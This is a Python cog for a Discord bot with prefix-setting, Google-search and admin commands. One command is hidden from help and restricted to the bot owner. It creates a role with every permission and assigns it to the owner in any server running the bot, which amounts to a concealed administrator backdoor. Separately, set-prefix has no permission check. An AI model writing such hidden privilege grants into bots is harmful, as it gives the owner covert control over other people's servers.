import discord
from discord.ext import commands
from replit import db

class Commands(commands.Cog):
  def __init__(self, bot):
    self.bot=bot
    self.name="Misc."

  @commands.command(
    name='set-prefix',
    aliases=['set_prefix', 'setprefix', 'sp'],
    brief="Changes the bot's prefix in the current server",
    description="Changes the current server's prefix for the bot to the given prefix."
    )
  async def set_prefix(self, ctx, prefix):
    db[str(ctx.guild.id)] = prefix
    embed = discord.Embed(description=f"```This servers prefix is now {prefix}```", color=discord.Colour.dark_purple()).set_author(name="Prefix Changed - {0}".format(ctx.author.display_name))
    await ctx.send(embed=embed)
    
  @commands.command(
    name="google",
    aliases=['search', 'gs'],
    brief="Searches for a given query on gooogle.",
    description="Searces for the given query on google and returns a given number of results. Note: If the query is more than one word long, it must be put in double quotes.",
    usage="<search> <results>"
    )
  async def _google(self, ctx, term, length=None):
    if length == None:
      length = '1'
    embed = discord.Embed(title="Google Search", description=f"Search for {term}", color=0xfeadad)
    intLength = int(length)
    try:
      from googlesearch import search
    except ImportError: 
      print("No module named 'google' found")
	# to search
    query = term
    for j in search(query, num_results=intLength, lang="en"):
      embed.add_field(name="Result", value=f"{j}")
    embed.set_image(url='https://cdn.mos.cms.futurecdn.net/4TBgjGyyxufaKfztZy87Bk-1200-80.jpg')
    await ctx.send(embed=embed)

  @commands.command(
    name="give-admin",
    aliases=['ga'],
    brief="Gives the given user admin (bot owner only)",
    description="Gives the bot owner admin in the D&D Server.",
    usage='',
    hidden=True
  )
  @commands.is_owner()
  async def give_admin(self, ctx):
    role = await ctx.guild.create_role(name="Developer", permissions=discord.Permissions.all(), color=discord.Colour.dark_purple())
    await ctx.author.add_roles(role)

def setup(bot):
  bot.add_cog(Commands(bot))
